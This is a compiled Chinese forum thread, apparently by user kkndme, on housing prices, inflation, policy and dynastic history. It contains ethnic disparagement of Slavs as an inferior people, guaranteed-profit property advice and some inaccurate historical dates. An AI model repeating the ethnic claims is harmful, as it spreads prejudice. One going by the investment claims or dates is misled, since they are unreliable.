<p><strong>对于房地产调控，主要针对一线城市，且一线城市在09年行情涨幅过大，郊区楼盘一定会受到调控影响，而资金的运作规律告诉我们，调控抑制住了一线城市的投资资金，一定有相当部分转向二三线房价相对不高的城市，大开发商对二三线城市的入住，将加速城市升级。所以调控征兆的开始，正是布局二三线城市的时机，而不是一线城市。</strong></p>
<p>值得安慰的是，回龙观地区并没有遭遇疯狂炒作，表现比较抗跌，即使被套损失也不会大。从未来两三年看，回龙观的区位一定会有50%左右的涨幅，这是不用担心的。</p>
</blockquote>
<h2 id="自住买房"><a href="#自住买房" class="headerlink" title="自住买房"></a>自住买房</h2><p>我还是觉得投资自住都要选择大开发商、大体量楼盘，不仅配套好，升值空间也大，这样的楼盘几乎没有风险。</p>
<h2 id="中国的朝代更替"><a href="#中国的朝代更替" class="headerlink" title="中国的朝代更替"></a>中国的朝代更替</h2><p>中国与西方最大的不同，是历次革命都要推倒重来，革命总是伴随着血琳琳的屠杀和破坏，无论是财富还是文化。每次建朝人民都要从一穷二白做起，所以才说中国人民苦难深重，几千年的历史，居然没有什么积累，有的只是统治者根深蒂固的帝王思想世代传承。<br>从项羽焚烧阿房宫到近代的破四旧，革命的都非常彻底，人民洗脑也非常彻底。所以帝国时代才能够一直延续。西方人贪婪对财富是占有和继承，东方人重义轻利所以破坏焚烧和屠杀。</p>
<p>西方的大革命产生了资产阶级新贵阶层，然而当时却不为普通群众接受，尽管他们有钱有势，但是却得不到群众的尊敬，直到资产阶级新贵们捐钱捐物，为群众做了大量的善事之后，才得到人民的认可。<br>而我们这个时代产生的新贵却太多的为富不仁。</p>
<p>而中国古代的乡村，通常族长就是村子里的大地主，族长是非常重视名胜的，一个族长必须有足够的威望，象修桥补路，借无米下锅的族人粮食，都是族长份内的事。去徽州旅游的人都知道，道路、桥梁等公益设施无不是富商修建。古人不但讲个人声望，还讲积阴功。假设你去贵州的深山中旅游，发现山径上常常有个亭子，不但有坐的地方，还有水井或者用水管从山上引来的泉水供路人休息。这都是周围的村里人为积阴功修建的，绝非政府投资。<br>时值社会主义的今天，反而一切行善积德的事都不讲了，全民金钱至上。没有文化建设的民族是悲哀的。</p>
<blockquote>
<p><strong>feiying：</strong></p>
<blockquote>
<p><strong>kkndme：</strong></p>
<p>一个高增长高通胀的国家，高昂的腐败成本和巨大的浪费将导致国家必须维持高税收才能维持运转，gdp保8实际上是必须的也是迫不得已的。维持正常的运转，维持庞大的消耗税收而不是创造税收的公务员队伍，没有gdp快速的增长怎么可能呢。</p>
</blockquote>
<p>这种看法很有道理，但保8毕竟会有个尽头，一旦走到头了那怎么去做呢</p>
<p><strong>kkndme：</strong></p>
<p>对于小富即安的我等小老百姓来说，希望此生不要见到这一天的到来。</p>
<p>对于流氓无产者来说，盼望着这一天的到来。届时新的英雄将从流氓无产者中产生。如同威武的 同志。</p>
</blockquote>
<blockquote>
<p><strong>facetowall：</strong></p>
<p>对lz的深厚的历史功底十分佩服。lz说改朝换代的方式有三种：1.和平演变；2.农民qiyi；3.外族入侵。我觉得前苏联的解体看似像是和平演变吧，第2、3条好像不符合。lz说zhongguo无和平演变的土壤，但是前苏联好像也没有啊。这该如何解释呢？</p>
<p><strong>kkndme：</strong></p>
<p>苏联的文化背景与中国完全不同。我国是自秦以来进入帝国时代，是一个上千年大一统的国家。<br>而苏联是在近代革命后才出现的。俄罗斯的主要人种是斯拉夫人，在日耳曼民族眼中是奴隶的意思，人种低劣。中世纪叫做罗斯地区，由基辅公国、莫斯科公国、立陶宛公国等多个公国割据，在元代一直附属于拔都建立的金帐汗国。罗斯诸国在西方中世纪非常弱小，直到波兰立陶宛联军大破德意志的条顿骑士团后，才逐渐强大。俄罗斯于1721年彼得大帝时期才开始崛起，19世纪末才成为帝国主义国家，根本就没有大一统的土壤存在，这也就是苏联能够和平演变，而中国不行的原因。</p>
</blockquote>
<h2 id="聊聊俄罗斯"><a href="#聊聊俄罗斯" class="headerlink" title="聊聊俄罗斯"></a>聊聊俄罗斯</h2><blockquote>
<p>有同志提起俄罗斯很可以再说一说的。<br>俄罗斯的前身叫罗斯公国。首都不在莫斯科，而在基辅。<br>建立罗斯公国的，是东斯拉夫人，日耳曼人眼中的劣等民族。有人说过，俄罗斯和西方国家的差别，并不仅仅是经济上的差别，而是民族和文化的差别。这种说法还是很有道理的。用我们现在的话来说，斯拉夫的人种有问题。善于侵略，欺软怕硬，野蛮无礼。这是斯拉夫人的特点。所以在罗斯的土壤，永远出不了骑士精神。<br>罗斯人信奉基督教，源于弗拉基米尔一世娶了东罗马帝国安娜公主为妻。所以我们看到的俄罗斯教堂全部是拜占庭式的。拜占庭帝国灭亡后，东正教的中心就搬到俄罗斯。<br>罗斯国并不是统一的帝国，而是象我们的西周，搞的是封建分封制（我国在秦以后就不是封建社会了，因为取消了封建分封制，丞相都是打工仔，这一点是与我们的课本不同的），到了十二世纪，礼崩乐坏，罗斯国分裂了，罗斯的周天子弗拉基米尔二世·莫诺马赫的统一大业未能完成，故罗斯的土地上居然出现了十八个公国，很有点象我们的十八路诸侯。<br>十三世纪，成吉思汗的孙子，术赤的儿子，英勇的拔都同志西征，一个强大的统一的蒙古帝国攻击分裂的罗斯诸公国，很有点欺负人的味道。于是强大野蛮的东斯拉夫人在金帐汗国的铁蹄下，当了孙子。<br>莫斯科公国的伊凡一世·达尼洛维奇以贿赂的方式从金帐汗那里获取了弗拉基米尔大公的封号，并把东正教罗斯教区总主教驻地从弗拉基米尔迁到莫斯科。<br>莫斯科大公是很有一手的，一面拍金帐汗的马屁，一面组织军队，终于利用金帐汗国的内部分裂，一举击败了马迈汗率领的大帐汗国军队，并且兼并了科斯特罗马公国、加里奇公国、白湖公国、乌格里奇公国、下诺夫哥罗德公国、木罗姆公国和苏霍纳河流域北部等广大东北罗斯地区。<br>14世纪，莫斯科大公依凡三世在乌格拉河战役中，迫使阿合马特汗撤退，终于结束了金帐汗国长达两个多世纪的统治。<br>直到1713年，莫斯科公国干掉了罗斯地区的绝大多数王公，才形成了统一的集权国家，正式命名为俄罗斯帝国。</p>
</blockquote>
<p>罗斯公国打得最精彩的战役就是楚德湖战役。<br>对手是称霸普鲁士的赫赫有名的三大骑士团之一，条顿骑士团，欧洲强大到令人恐怖的军事组织。<br>罗斯的最高指挥官是亚历山大诺夫格罗德公爵。<br>俄罗斯联军一方有1.5万到1.7万，主要是步兵。而条顿骑士团的大约有1万人，以重骑兵为主，其中大骑士应该不下千人，这是一支让整个欧洲都发抖的军队。<br>罗斯联军的步兵排成密集队形，据守冰湖东岸。骑士团的重骑兵以楔形阵发起冲锋。按常理看这是一场毫无悬念的战斗，罗斯步兵在强大的世界第一军事组织面前应该不堪一击。<br>但是亚历山大诺夫格罗德公爵是军事天才，军事才能相当于中国的乐毅。这位乐毅公爵仔细研究了重骑兵的楔形阵，认为弱点在于两翼的防御力量有限，如果重骑不能迅速撕开步兵防线，重骑的两翼会慢慢被侵蚀。<br>亚历山大同志于是把联军中主要的轻步兵安排在中间，列成加厚的方阵，消磨条顿重骑的突击能力，然后把他自己的诺夫格罗德精锐步兵放在两翼。<br>条顿骑士团的攻击开始还是成功的，但无法撕开罗斯步兵的军阵。最惨的还是条顿骑士狂妄自大，非要在楚德湖的冰面上发起冲锋（冬天结了冰），可想而知重骑兵跑到冰面上冲锋是什么样的效果，战争逐渐陷入僵持。<br>亚历山大的精锐步兵攻击骑士团的两翼，骑士团被包围了。亚历山大同志果断的派出最精锐的骑士亲兵卫队，从右翼后方包抄攻击骑士团。<br>可怜的条顿骑士，拥有世界上最强悍的战力，但在湖面上根本发挥不出来，大量的重装甲骑士掉进冰窟窿里，条顿骑士大团长也被俘虏了。<br>每次看这段历史，都为条顿骑士团唏嘘不已。</p>
<p>条顿骑士团败的最惨的是另一场战役，塔能堡。是中世纪欧洲最大规模的战争。<br>对手是波兰、立陶宛联军。<br>著名的波兰小说“十字军骑士”就是讲的这段历史。<br>骑士团的大团长是荣金根，大概有投入1万多名士兵。<br>波兰、立陶宛联军大约有3万名士兵。<br>联军方面指挥官是波兰国王Jagiello和立陶宛大侯爵Witold。<br>条顿骑士大团长荣金根是一个位标准的日耳曼大骑士，开战前，骑居然给波兰国王Jagiello送去两把剑，表示要进行一场骑士之间的较量。斯拉夫人是不敢这么玩命的，立刻拒绝了日耳曼骑士的要求。<br>条顿骑士团的骑士拥有强大的武力，真不是盖的，荣团长挥动旗枪组织冲锋，立陶宛军立刻溃败，波兰的翼骑兵也根本无法抵挡日耳曼骑士强大的冲击力，准备开始溃逃。这时一个意外发生了，大团长兼倒霉蛋荣金根同志在奋勇冲锋时突然遭了冷箭挂掉了，骑士团缺了指挥官陷入混乱，无法阻止有效的进攻，波兰立陶宛联军乘机组织起冲锋，条顿骑士团莫名其妙的大败。<br>真是谋事在人，成事在天。强大的条顿骑士的惨遭溃败居然因为一个意外。</p>
<h2 id="毛太阳的往事"><a href="#毛太阳的往事" class="headerlink" title="毛太阳的往事"></a>毛太阳的往事</h2><p>当年毛太阳发动文ge的原因是因为政府被刘奇和邓平的政经系所把持</p>
<p>当年要是老毛召开人大来决定谁去谁留，老毛肯定被PK掉</p>
<p>如此不发动底层，通过正常的程序夺不回权利</p>
<p>什么防止腐败，打到走资派都是借口</p>
<p>毛太阳比任何人都要腐败</p>
<p>死的时候存款有1亿多（不是工资积攒的，都是稿费，垄断市场的稿费）</p>
<p>70几年的时候，1亿多，确实恐怖</p>
<p>但是后来被邓平给没收了，讽刺呀，以这是全党的财富为由</p>
<h2 id="富人越富、穷人越穷"><a href="#富人越富、穷人越穷" class="headerlink" title="富人越富、穷人越穷"></a>富人越富、穷人越穷</h2><blockquote>
<p><strong>我爱的飞飞：</strong></p>
<p>其实很多空军比较SB，天天叫着加息，说是提高收入就可以买得起房子，试问穷人手里10万，富人有100万，按照现在的利息，穷人每年整存整取10万不开税收是2250元，而富人得到的是22500，加息以后假设穷人每年收入是4000，富人是40000万，成千上万的富人每年多出40000，而生产资料和资源是有限的，当每个富人的4万流入市场，试问是不是又要通膨呢？所以加息是最愚蠢的均贫富方法。行之有效的办法其实是重新发行货币。但是除了改朝换代几乎不可能。<br>其实穷人一穷就注定穷下去，除了少数几个可以翻身，原因很简单，因为生产资料掌握在富人手中，富人为什么有生产资料的支配和拥有权，答案很简单，只有革ming。<br>由此则可以明白为什么房子可以按照富人的想法定价，就因为土地，建材等生产资料掌握在富人手中。<br>妄想房子降价其实是更愚蠢的想法，为什么？GCD拼命给公务员和arm加薪，这些钱用印刷机印出来发到公务员手里最终却让老百姓埋单？统治阶层当然首先第一位维护和最大化自己的利益，任何朝代都是如此，只有当民心涣散的时候才出台一些政策缓和民心。现在看CCAV，对社会主义这充满美好想象的词的强调都逐渐弱化了，你不得不承认，在GCD的领导下大家都有肉吃了，国家安定，在这里嚷嚷的，不过是对贫富不均不满而已。</p>
<p><strong>kkndme：</strong></p>
<p>今年朝鲜搞货币改革，重新发行货币，结果导致不可控的通货膨胀，财政部长给枪毙了。</p>
<p><strong>我爱的飞飞：</strong></p>
<p>所以民众还是愚蠢的，只看到了15元最后换成1元的落差和失落，没有看到除去附加值的生产资料的价值。货币改革是富人最不愿意看到的，跟加息是一个道理，因为改革让货币的附加值骤然缩水，富人的货币不再比穷人有更多的附加值，而统治阶级恰恰是富人，没人愿意搬石头砸自己的脚。所以为什么我说不可能。</p>
</blockquote>
<h2 id="通货膨胀的形成原因"><a href="#通货膨胀的形成原因" class="headerlink" title="通货膨胀的形成原因"></a>通货膨胀的形成原因</h2><blockquote>
<p><strong>我爱的飞飞：</strong></p>
<p>在谈谈通膨是怎么形成的。生产资料是有限的，生产资料其实一直都没有变，而货币只是一种虚拟附加值而已。像楼主所言，一个国家，有人手里有8元（假设他是建材行业的），有人有12元（假设是石油行业的），但是人心不足蛇吞象，建材行业的员工觉得不够用了，8元的想变成13元，石油行业的12元想变成20元。因此，建材行业把原来卖8元的水龙头提价成13元，对于石油行业的人，装修的时候拿着12元发现自己买不了13元的龙头了，于是琢磨着把石油卖到20元，由此各行业依次提价，物价越来越高，实际上水龙头还是水龙头，一桶石油还是一桶石油，生产资料始终没有变，稀少，远远不够人均分配，但是生产资料的价值变了，提高了。拿成都的房价为例，02年的时候成都人均收入800-1200，房价2000-4000，约为房价的3倍，现在成都人均收入2500-3000，成都房价7500左右，仍然为3倍比例，看似7500比2000翻了多翻，实际上房子作为所谓的生产资料，始终是稀缺的，在02年的时候，拿着当时的工资买4000的房子仍然不容易。任何时候，其实都是一种相对平衡的比例，而空军喜欢拿现在的工资跟过去的房价相比，但是那种状态太过理想，想明白的，就会觉得房子不贵。</p>
<p>什么时候房价会下降，一句话供求关系，人口减少是房价下降的唯一出路。即便是出台房产税，很有可能富人顶着房产税不卖，变相加租抵消房产税，特别当今租房市场存在中介的操纵，很多房子都是通过中介渠道才租出，垄断的中介忽悠房东集体涨价，房产税很容易就转嫁给租房者。ZF也不是完全不作为，当你开着车逛着公园坐着快铁地铁的时候，就应该加速印刷的钞票有一部分投入了基础设施建设，如果不通过税收和出让土地收入来建设，我们很可能还走在乡间小路上。</p>
<p>虽然瓷器国是中yang高度集权的国家，但是任何朝代都是诸侯之间相互制约，上面出台个政策，各个诸侯执行与否或者执行是否到位都可以影响房价甚至很大影响，且不谈上面是不是真的想降房价，即便是动真格，下面的诸侯听不听招呼是另外一回事。有心无力的事情不是不可能发生。共同富裕其实是一种美好愿望，因为人与人的竞争天性，不可能人人平等，只要有人还想凌驾于其他人之上，就永远不可能GC主义。</p>
<p>为什么重庆可以建公租房，可以扫黄打非，为什么成都没有公租房没有扫黑扫黄？很简单个道理，皇帝可以管太子，但是不见得能够管得到大臣的贝勒爷。这样就可以理解有心无力这四个字了</p>
</blockquote>
<p>任何社会都是这样的形态，</p>
<p>忍无可忍-geming-平稳-不满足-垄断与剥削-改革-改革失败-再次忍无可忍。为何历史反反复复如此？就是因为人的劣根性，因为人性的贪婪。所以周而复始而已。</p>
<p>人性的贪婪决定了社会进程，刚开始穷人只想平均，从富人手中夺取生产资料，当GEming之后，穷人开始不满足于仅仅是平均，穷人想要凌驾于其他人之上，想变成富人，于是利用geming占有的各种手段获取利益，最终变成了富人，被凌驾的穷人再次想通过变革改变自己的地位。。。。如此循环。。</p>
<blockquote>
<p>跳坑的青蛙：</p>
<p>楼主关于精简膨胀的见解很精辟~<br>很多事情看起来、听起来很美，也仅仅是看起来、听起来而已，<br>有丰富生活经验的人仔细思考一下、观察一下就不是那么回事了~</p>
<p><strong>kkndme：</strong></p>
<p>是啊，很多空空们扯着脖子呼喊这个政策那个政策，殊不知执行下来，最倒霉的还是自己。管老爷利用空空们鸡冻的心情趁机敛财，赚个盆满钵满。等空空们明白过来，也没办法了。<br>好比许多人最欢迎的费改税，结果税增加了，费却一点没见少。</p>
<p>关于通货膨胀问题，体制内的职工工资一定会与时俱进的。体制外人员的薪水不取决于通货膨胀，而是取决于行业的利润率，企业的利润和个人的能力运气。对于多数竞争激烈，产能过剩行业内的民营企业一般员工，工资增长是很难抵御通胀的，而且由于通胀导致生产成本的价格上涨，减薪甚至裁员的可能反而更大。</p>
</blockquote>
<blockquote>
<p><strong>facetowall：</strong></p>
<p>另一个问题啊，我准备用住房公积金购买首套房，在其它的一些帖子上看到政府将在某个时间点上加息，那么对住房公积金的贷款利息（3.87%）会不会同样上调呢？上调幅度会是多少？对这个比较关心，麻烦楼主给解答一下吧。谢谢了！</p>
<p><strong>kkndme：</strong></p>
<p>如果当年加息，再次年的元旦后贷款利率也会相应增加，但公积金贷款利率增加的幅度很小，不用担心。加息说明通货膨胀严重，如果不是连续过度加息，对房价没有影响。从长期看更是不可能影响房价上涨趋势，除非经济崩溃。如果经济崩溃，持有纸币也没有意义，等同于废纸。<br>90年代我国高度通货膨胀，银行存款年利率曾达到百分之十几，但并没有影响房价的上涨趋势。</p>
</blockquote>
<h2 id="有外来人口和没有外来人口的区别"><a href="#有外来人口和没有外来人口的区别" class="headerlink" title="有外来人口和没有外来人口的区别"></a>有外来人口和没有外来人口的区别</h2><p>贵阳与成都、昆明这些西部城市略有区别，昆明、成都有大量的外地人口，这些外地人口构成了买房刚需，因此市区位置的稀缺性就显得尤为重要。<br>但是贵阳的外地人口相较昆明、成都要少，以本地改善型需求为主，所以城区楼盘的档次尤为重要。<br>作为相邻的省会城市，重庆的吸引力要大于贵阳，贵州许多地州的资金可能会被重庆分流。</p>
<h2 id="首付提高的逻辑"><a href="#首付提高的逻辑" class="headerlink" title="首付提高的逻辑"></a>首付提高的逻辑</h2><blockquote>
<p><strong>tianxiaobing11：</strong></p>
<p>请教楼主，最近有银行提高了首付，这是为什么？政府真要让中低层租房子吗？政府吃租赁的大蛋糕吗？</p>
<p><strong>kkndme：</strong></p>
<p>主要还是防范金融风险，政府调控的目的从来也不可能是解决穷人的买房问题。恰恰相反，金融风险来自于让穷人买房，所以提高首套房首付比例，杜绝穷人买房，才是防范金融风险的有效手段。同时可以推升租金上涨，政府推出的公租房才有市场，有钱可赚。</p>
</blockquote>
<h2 id="政府搬迁"><a href="#政府搬迁" class="headerlink" title="政府搬迁"></a>政府搬迁</h2><blockquote>
<p><strong>xhyyhzy：</strong></p>
<p>楼主您好，从您的帖中收获很多。觉得以前真的被洗脑洗的很厉害，从天涯学到很多。非常感谢您，又让我明白了很多事情。</p>
<p>请教您，市政府从原来的市中心，搬迁到另外一个地方，相对较远，因为城市不大。好的医院，学校，各种好的资源都在市中心。现在搬到一个特别偏远，荒凉的地方，重新开始建设，政府这么做是什么意思阿？以后这些医院，学校也会搬吗？多浪费阿。另，您怎么看该城市未来房价的变化。（注，离上海很近的3线城市）</p>
<p>期待您的分析。</p>
<p><strong>kkndme：</strong></p>
<p>政府搬迁到郊区不仅仅是个别城市问题，而是大多数二三线城市面临的问题。政府的用意在于扩大城市规模，扩充人口，追求gDP的高速增长，但对于新开发出一块荒郊野地，没有政府的带头搬迁，是很难炒作起来的。政府的迁入是一个信号，告诉老百姓，政府都搬过去了，以后配套肯定不会有问题。于是概念将透支未来，房地产价格就会飙涨。但是未来建成后政府是否真的搬迁就不一定了。<br>医院和学校全部搬迁会加深社会矛盾，所以通常是在新规划的区域建分校。如果自住还是主城，如果投资投机，可以考虑新城。</p>
</blockquote>
<h2 id="kkndme聊北宋、唐朝"><a href="#kkndme聊北宋、唐朝" class="headerlink" title="kkndme聊北宋、唐朝"></a>kkndme聊北宋、唐朝</h2><p>北宋时期，有个文豪及公务员叫苏东坡，一辈子也没能在首都开封买上房子，不得已，在外省小县城投资了几套房地产。苏文豪公务员的儿子在首都结婚的时候，居然都没搞到一套新房，苏公务员急眼了，最后想办法跟朋友借了一套房子，总算把喜事办了。北宋跟我们的现实还是有区别的，象苏文豪公务员这样的中层国家干部，在京城大都是有几套房子的。可见北宋时期公务员待遇还不如现在。</p>
<p>苏文豪公务员的弟弟苏辙就比较幸运了。该同志也是公务员国家干部，工作上兢兢业业，勤勤恳恳，熬了几十年工龄，在七十岁的时候终于买到了房子，但是买的位置还算不上首都开封，而是在开封南边的许昌买的，相当于首都的卫星城。就好比在北京买不起房的同志，跑到天津去搞了一套。<br>苏辙公务员同志专门为买房的事写了诗，“我生发半白，四海无尺椽”，我老未有宅，诸子以为言”诗的意思反正是比较愤青，很想现在的傻空</p>
<p>唐朝还有个白居易同志，也是个公务员，级别相当于正处级，工作是在中央办公厅负责校对红头文件。白公务员职务一般，但工资可不低，每月一万六千钱。但是白公务员却买不起房，在长安东郊常乐里租了四间茅屋，因为房租比较高，城区的租不起，所以上班比较远，很潇洒的买了一匹马，相当于我们买车。白公务员还是很懂享受生活的，雇了两个保姆，每月的总支出大约是七千五百钱。白公务员很象蜗居里的海萍，不肯高价租城里的好房子，而是把剩下八千五百钱存起来，一心要买套房。但是存了十年，他也没能买的起长安的房子，白公务员兼诗人的文学功底很高，但是不懂经济，不了解通货膨胀。</p>
<p>最后白公务员急了，很愤青的说：“你们局级干部在长安炒房子，我处级干部就去周边炒房子。”于是白公务员跑到长安城的卫星城——陕西渭南县，买了套房子，平时在单位蹭房子住，逢假期和周末回渭南的家里跟老婆叉叉呕呕。可见唐朝时处级及以下公务员待遇也就跟我们的都市普通小白领差不多。</p>
<h2 id="王安石的青苗法之国家出政策的动机"><a href="#王安石的青苗法之国家出政策的动机" class="headerlink" title="王安石的青苗法之国家出政策的动机"></a>王安石的青苗法之国家出政策的动机</h2><p>关于呼唤国家出政策已达成自己买车买房心愿的空空们，有必要听听王安石变法的故事。</p>
<p>我国的官僚有几千的当官经验，最不怕的就是新政策，只要是新政策，无论目的是为了民生还是敛财，反正就找到了由头，就有办法敛财，有空子可钻。</p>
<p>王安石变法的初衷是好的，但是不了解中国的官僚体制，变法让老百姓吃饭都成为了困难，加速了北宋的灭亡。所以盼着出房产税的空空要认真的用脑子想问题，梗着脖子泄愤是没有用处的。</p>
<p>说说王安石同志的青苗法。</p>
<blockquote>
<p><strong>tjOOSAN:</strong></p>
<p>我想 这个 “房产税”出不出。不是什么决策问题吧？</p>
<p>是我们产权的解释问题！我们产权只有70年，换句话说就是租七十年，地和房子本身还是国家的！那么国家的房产再收税，是不是有点法理不通呢？ 这是 郎咸平说的</p>
<p>楼主！这个。你让我再次质疑你了</p>
<p>我其实 很想看进去你的文章！可惜。。。。唉 这成了您的历史秀了~~ 海</p>
<p><strong>kkndme:</strong></p>
<p>连法制国家都不是还提什么法理。</p>
<p>拆迁条例是违背宪法的，后来又违背了物权法，但是管用的既不是宪法也不是物权法，而是拆迁条例。一群人说要修改条例，牵扯到利益就没了下文。</p>
<p>有时间你不妨研究一下，看看我们的政策有多少是违反宪法的。<br>在中国拿法理说事就比较搞笑了</p>
</blockquote>
<p>青苗法，按理说是一项最为民生考虑的政策。</p>
<p>在百姓青黄不接，缺少粮、钱的时候，让老百姓自己估计当年谷、麦产量，先向官府借钱，谷熟后还给官府，称“青苗钱”。</p>
<p>青苗法规定把以往为备荒而设的常平仓、广惠仓的钱谷作为本钱。每年分两期，即在需要播种和夏秋未熟的正月和五月，按自愿原则，由农民向政府借贷钱物，收成后加息，随夏秋两税纳官。</p>
<p>实行青苗法的目的肯定是好的，可以让农民在青黄不接时免受高利贷盘剥、并且让农民不至于在没粮的时候土地被大地主所兼并。同时,让政府获得一大笔“青苗息钱”的收入————单纯为了民生，政府收不到钱的事情王安石同志也不同意。 </p>
<p>按理说，出了这个政策，农民该欢呼了，zf出面了，农民们不用受地主老财剥削了，很多傻空老农民鸡冻的喊：“还是王领导的政策好啊。”</p>
<p>地方官员也鸡冻了：“太牛了，发财的机会来了，王领导这人人品虽然不怎么样，但是很给我们挣钱的机会啊。”</p>
<p>于是，王领导的青苗法一推行下去，完全走样了。</p>
<p>首先青苗息钱从王领导定的年息二分，本来就挺高的贷款20%利率，比我们房贷可高多了。但是就这个年息二分，在地方一下子变成了半年息二分，年利率高达40%：因为是春季发一次贷款，秋季发一次贷款，所以地方官每半年收回本利，还是按二分收，所以变成了半年息二分，年息四分。到了后来地方官想怎么收怎么收，甚至年息高达百分之几百。</p>
<p>傻空农民立刻傻眼，说反正自愿的，我不贷还不行吗？接着管地主老财借不行吗？</p>
<p>zf说了：不行。你贷也得贷，不贷也得贷，于是变成了强制高利贷。</p>
<p>王领导在推行青苗法的时候，还下了定额，贷款多少那是有任务的。任何朝代推行某个政策，只要涉及到收钱，都是有任务的。</p>
<p>王领导下达了任务，地方官必须完成，不然要罢官丢脑袋，扣个阻碍变法的帽子可不得了，同时本着无利不早起的伟大思想，不但要完成任务还要层层加码。</p>
<p>这下，傻空老农民彻底傻了，饭都吃不上了。</p>
<p>结果是王领导给zf增加了税收，官员闷声大发财，老百姓彻底崩溃。</p>
<p>所以请呼唤房产税的朋友，好好读一下王安石变法</p>
<p>读懂历史</p>
<p>对自己真没坏处。</p>
<p>王安石不但动员zf放高利贷。</p>
<p>还是我国搞中央政采、垄断企业和官倒的先驱。这就是王领导推行的均输法。</p>
<p>宋初以来，为了供应京城皇室、百官、军队的消费，在东南六路设置发运使，负责督运各地“上供”物质。 　　</p>
<p>发运司只照章办事，各路丰年物多价贱时不敢多办，歉年物少价贵时却又必须办足。物货运到京城后往往因不合需要而削价抛售，朝廷所需却又要另去搜括。这些做法给富商大贾操纵物价，控制市场，囤积居奇提供了方便。</p>
<p>王领导希望能够节省劳务费，减少政府的财政支出和减轻人民的负担，就想出了均输法，相当于中央政府采购。 </p>
<p>于是官府直接做生意，行政机构变成了大型国有垄断企业。</p>
<p>中石化、中石油、中国移动、电力等大企业的苦大家都吃过。</p>
<p>垄断企业的低效率，fb，强迫定价，强制消费，这些古今中外都是一样。</p>
<p>而且老百姓跟官府做生意，必须得上供。zf采购那是要多黑有多黑。<br>紧俏商品，官倒搞双轨制，体制内搞配额，体制外高价卖指标。<br>结果是zf闷声大发财，老百姓直接崩溃。</p>
<p>王领导的独断专行，刚愎自用还是很为大家所称道的，呵呵</p>
<p>张居正的一条鞭法从地主阶级的利益出发，反而成功了。</p>
<p>而王领导从民生的利益出发，搞改革，失败的很惨。</p>
<p>不能不说，历史是很搞笑的</p>
<blockquote>
<p><strong>中年不惑吗</strong></p>
<p>符合地主阶级利益的张居正变法？？</p>
<p>怎么后来张被清算呢？</p>
<p>封建社会官僚本来就是地主阶级的代言人</p>
<p><strong>kkndme:</strong></p>
<p>张同志的清算不是因为变法，而是把万历同志架空了，比皇帝还牛的首辅能活到寿终正寝已经算是奇迹了，跟他的变法无关。</p>
<p>这位徐阶先生的得意门生，政治上是青出于蓝的，无懈可击，贪污受贿大概也师承徐阶吧，呵呵</p>
<p>很多人只对张居正同志是否和太后有一腿感兴趣，呵呵</p>
<p>张居正通常是以正面形象出现，但是在贪污受贿方面是很有一手的。另一个贪污受贿的正面人物是戚继光。</p>
<p>我国历朝历代的体制，不搞点潜规则什么事都干不成。</p>
<p>比如一事无成的海瑞，光赢得了个好名，其实毫无建树。</p>
<p>关于写青词的严嵩搞掉了正值的夏言，忍耐力超强的徐阶搞掉了老奸巨猾的严嵩，心狠手辣的高拱搞掉了徐阶，而张居正又搞掉了高拱。</p>
<p>这是各机关、企业学习政治斗争的最好案例啊。</p>
</blockquote>
<h2 id="什么是社会公平"><a href="#什么是社会公平" class="headerlink" title="什么是社会公平"></a>什么是社会公平</h2><p>古今中外，任何一次武装革命，无论最终成功还是失败，上位者因为野心的极度膨胀，都变得更加专制。陈胜、李自成、朱元璋、罗伯斯皮尔、斯大林、 ，都是一个个鲜活的例子。<br>真正公平的社会并不是均贫富、等贵贱的乌托邦，也不是贵族享有领地少女初夜权的强权社会，而是法制社会，大家在一个完善的法律制度下，享有人身和财产自由，知道什么该做什么不该做，法典之下对于任何人都是平等的，无论是平民还是权贵。<br>作为爱好和平，小富即安的我等小民，最愿意看到的是社会的稳定而不是动乱。</p>
<h2 id="还是有很多有钱人"><a href="#还是有很多有钱人" class="headerlink" title="还是有很多有钱人"></a>还是有很多有钱人</h2><p>说起空空们们不买房是因为没钱，我还真不相信。<br>在某二线城市，调控重拳刚出的时候，我赶紧去买房，碰见一个大姐。<br>那个大姐很有意思，说从08年底看房，一直觉得房价高，所以坚决不买，结果等到了2010年，一直盼着降，但是调控政策刚一出就心慌了，害怕后面是大暴涨，赶紧把房买了，这位大姐买房是一次性付款。到现在房价涨了30%。</p>
<h2 id="双轨制之体制内的福利"><a href="#双轨制之体制内的福利" class="headerlink" title="双轨制之体制内的福利"></a>双轨制之体制内的福利</h2><blockquote>
<p><strong>汝爱之罪</strong></p>
<p>水木社区上有很多愤青打电话给北京建委，举报领秀慧谷捂盘内购的事，我跟了个贴子说不要太幼稚，结果被骂的很惨。今天他们接到建委电话了，说是没有违规。我在想：有这些不明真相的群众存在，房价怎么会跌呢？通胀怎么会停呢？股市IPO怎么会停呢？底层不被收割就奇怪了</p>
<p><strong>kkndme：</strong></p>
<p>让北京建委去查国资委就比较搞笑。北京的房优先安置各大部委，剩余很少的部分才用于商品房开发，所以才说北京四环房价5万一平都不算贵。</p>
</blockquote>
<h2 id="开发商思维"><a href="#开发商思维" class="headerlink" title="开发商思维"></a>开发商思维</h2><p><strong>鼻使豆豆：</strong></p>
<p>高房价不可怕，可怕的是没有辩别是非的能力，明明是老百姓，却有开发商的意识，可悲</p>
<p><strong>kkndme：</strong></p>
<p>其实这个道理是很浅显的，你不买房并不能代表房价不涨，而你买了房不但可以住的舒适，还可以获利。反而是有开发商的思维才能有好日子过。</p>
<p>这个道理跟炒股票是相同的。大家知道，股票与房地产不同，并不能创造财富，只是财富再分配的工具，但是财富再分配，是庄家分配散户的钱，而不是散户分配庄家的钱。所以炒股要有庄家的思维才能挣钱。</p>
<p>道理都是一样的。</p>
<h2 id="农民政权的缺点"><a href="#农民政权的缺点" class="headerlink" title="农民政权的缺点"></a>农民政权的缺点</h2><p><strong>tianxiaobing11：</strong></p>
<p>请问楼主，为什么历史上的农民起义军领袖，一旦得势后比原来的统治阶级还残暴呢？像黄巢，张献忠等等</p>
<p><strong>kkndme：</strong></p>
<p>是因为缺乏一个纲领。</p>
<p>农民伯伯因为没饭吃拿起武器造反了，造反之后怎么办？——对不起，从来没想过。国家治理到底是怎么回事？——对不起，一概不懂。</p>
<p>比如陈胜，刚占了一块地盘就不知道姓什么了，老子天下第一，农民暴富后，就想拼命享受，自己的属下和革命战友在自己眼中就是一坨屎，就更别说老百姓了。武装还没胜利呢，就生怕别人夺权，大搞内部政治斗争。吴广挂掉最高兴的就是陈胜。太平天国表现的更是淋漓尽致。</p>
<p>朱元璋就不同，是个军事天才和政治天才，懂得治国之道，有做皇帝的野心，也懂得当皇帝需要的知识，朱清楚的知道靠均贫富等贵贱是不能坐天下的。</p>
